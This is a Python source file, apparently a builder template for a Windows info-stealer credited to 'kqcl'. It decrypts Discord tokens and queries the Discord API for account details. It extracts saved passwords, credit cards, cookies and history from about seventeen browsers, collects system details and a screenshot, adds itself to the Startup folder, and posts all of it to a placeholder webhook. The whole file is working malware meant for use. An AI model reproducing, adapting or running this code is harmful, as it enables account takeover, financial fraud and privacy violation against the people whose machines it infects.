from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import re
from subprocess import Popen, PIPE
import requests, os
from datetime import datetime, timedelta
import json
import shutil
import sqlite3
import base64
import io
import zipfile
import platform
import subprocess
import pyautogui
from io import BytesIO
import sys
import getpass

webhook_url = "{webhook_placeholder}"
startup_add = "{startup_placeholder}"

def add_to_startup():
    if startup_add:
        try:
            USER_NAME = getpass.getuser()
            file_path = sys.executable  
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

            file_name = "co2Kuu7ciLCO4zhChB0V.bat"
            file_to_create = os.path.join(bat_path, file_name)
            if not os.path.exists(file_to_create):
                with open(file_to_create, "w+") as bat_file:
                    bat_file.write(r'start "" "%s"' % file_path)
                return "Successfully added to startup!"
            else:
                return "File already exists in the Startup folder."

        except Exception as e:
            return e
    else:
        return "Add to startup not enabled."


## Token Logger
def get_key() -> str:
    roaming: str = os.getenv("APPDATA")
    path: str = roaming + '\\discord'
    if not os.path.exists(path): pass
    try:
        with open(path + f"\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            return key
    except Exception as e:
        print(e)

def get_token() -> str:
    tokens: list = []
    roaming: str = os.getenv("APPDATA")
    path: str = roaming + '\\discord'

    for file in os.listdir(path + f"\\Local Storage\\leveldb\\"):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        else:
            try:
                with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except Exception as e:
                continue
    return tokens

def decrypt(b: str, master_key: str) -> str:
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, b[3:15]).decrypt(b[15:])[:-16].decode()
    except:
        return "Error"

def get_info(tokens) -> dict:
    for raw_token in tokens:
        for tk in tokens:
            if tk.endswith("\\"):
                tk.replace("\\", "")
        for raw_token in tokens:
            try:
                token = decrypt(base64.b64decode(raw_token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(get_key())[5:])
            except IndexError == "Error":
                continue
        
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        try:
            response = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        except Exception as e:
            print(e)
        try:
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
        except Exception as e:
            print(e)
        
        if response.status_code == 200:
            r = response.json()
            return {
                "username": r['username'] + '#' + r['discriminator'],
                "userid": r["id"],
                "email": r["email"],
                "phone": r["phone"],
                "mfa": r["mfa_enabled"],
                "nitro": bool(len(nitro_data) > 0),
                "token": token
            }
        else:
            print(response.status_code)

## Browser Stealer
appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def create_zip_with_data(data, browser_name):
    in_memory_buffer = io.BytesIO()
    with zipfile.ZipFile(in_memory_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
        zip_file.writestr(f'{browser_name}.txt', data)

    in_memory_buffer.seek(0)  # Move to the start of the buffer
    return in_memory_buffer

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key


def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content is not None:
        open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)


def get_data(path: str, profile: str, key, data_type_name):
    data_type = data_queries[data_type_name]
    db_file = os.path.join(path, f'{profile}{data_type["file"]}')
    
    if not os.path.exists(db_file):
        return None

    result = ""
    shutil.copy(db_file, 'temp_db')
    
    try:
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(data_type['query'])

        for row in cursor.fetchall():
            row = list(row)

            if data_type['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decrypt_password(row[i], key)

            if data_type_name == 'history':
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"

            result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"

        conn.close()
        os.remove('temp_db')
        return result

    except Exception as e:
        return None



def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')


def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

if __name__ == '__main__':
    available_browsers = installed_browsers()

    combined_data = {}

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        
        combined_data[browser] = "" 

        for data_type_name, data_type in data_queries.items():
            data = get_data(browser_path, "Default", master_key, data_type_name)  
            combined_data[browser] += f"{data_type_name.capitalize()} Data:\n{data}\n"  



    combined_zip = io.BytesIO()
    with zipfile.ZipFile(combined_zip, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
        for browser_name, browser_data in combined_data.items():
            zip_file.writestr(f'{browser_name}.txt', browser_data)

    combined_zip.seek(0)



## System information
def username():
    try:
        return os.getlogin()
    except:
        return "Username not found"

def pc_os():
    try:
        return platform.platform()
    except:
        return "Operating System not found"

def pc_name():
    try:
        return platform.node()
    except:
        return "Computer Name not found"

def cpu():
    try:
        return platform.processor()
    except:
        return "CPU information not found"

def ram():
    try:
        return str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
            shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
    except:
        return("RAM information not found")


def gpu():
    try:
        return subprocess.check_output("wmic path win32_VideoController get name").decode("utf-8").split('\n')[1].strip()
    except subprocess.CalledProcessError:
        return "GPU information not found"
    
def hwid():
    try:
        return subprocess.check_output('wmic csproduct get uuid').decode("utf-8").split('\n')[1].strip()
    except:
        return "HWID not found"

def make_screenshot():
    try:
        screenshot = pyautogui.screenshot()

        image_bytes = BytesIO()
        screenshot.save(image_bytes, format='PNG')
        image_bytes.seek(0)

        return image_bytes
    except:
        pass

def get_ip():
    try:
        response = requests.get("https://api.myip.com")
        return response.json()["ip"]
    except:
        return("Couldn't fetch ip")
    
## Webhook message

## embed constructor:
t = get_info(get_token())

embed = {
    "username": "Token Logger :3",
    "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/7/71/Black.png",
    "content": "@everyone",
    "embeds": [
        {
            "author": {
                "name": "kqcl",
                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/7/71/Black.png"
            },
            "title": f"Discord Information - {t['username']}",
            "color": 000000,
            "fields": [
                {
                    "name": "Username",
                    "value": f'`{t["username"]}`',
                    "inline": True
                },
                {
                    "name": "User-ID",
                    "value": f'`{t["userid"]}`',
                    "inline": True
                },
                {
                    "name": "Email",
                    "value": f'`{t["email"]}`',
                    "inline": True
                },
                {
                    "name": "Phone",
                    "value": f'`{t["phone"]}`',
                    "inline": True
                },
                {
                    "name": "2FA/MFA enabled",
                    "value": f'`{t["mfa"]}`',
                    "inline": True
                },
                {
                    "name": "Nitro",
                    "value": f'`{t["nitro"]}`',
                    "inline": True
                },
                {
                    "name": "Token",
                    "value": f'`{t["token"]}`',
                    "inline": False
                }
            ]
        },
        {
            "title": "PC Information",
            "color": 000000,
            "fields": [
                {
                    "name": "Username",
                    "value": f'`{username()}`',
                    "inline": True
                },
                {
                    "name": "IP",
                    "value": f'`{get_ip()}`',
                    "inline": True
                },
                {
                    "name": "OS",
                    "value": f'`{pc_os()}`',
                    "inline": True
                },
                {
                    "name": "PC-Name",
                    "value": f'`{pc_name()}`',
                    "inline": True
                },
                {
                    "name": "CPU",
                    "value": f'`{cpu()}`',
                    "inline": True
                },
                {
                    "name": "RAM",
                    "value": f'`{ram()}GB`',
                    "inline": True
                },
                {
                    "name": "GPU",
                    "value": f'`{gpu()}`',
                    "inline": True
                },
                {
                    "name": "HWID",
                    "value": f'`{hwid()}`',
                    "inline": True
                },
                {
                    "name": "Startup",
                    "value": f'`{add_to_startup()}`',
                    "inline": True
                },
            ],
            "image": {
                "url": "attachment://screenshot.png"
            },
            "footer": {
                "text": "Made by kqcl",
                "icon_url": "https://upload.wikimedia.org/wikipedia/commons/7/71/Black.png"
            }
        }  
    ]
}


files = {
    'file1': ('logged_data.zip', combined_zip.read(), 'application/zip'),
    'file2': ('screenshot.png', make_screenshot(), 'image/png')
}

payload = {
    "payload_json": json.dumps(embed)
}

response = requests.post(webhook_url,data=payload, files=files)
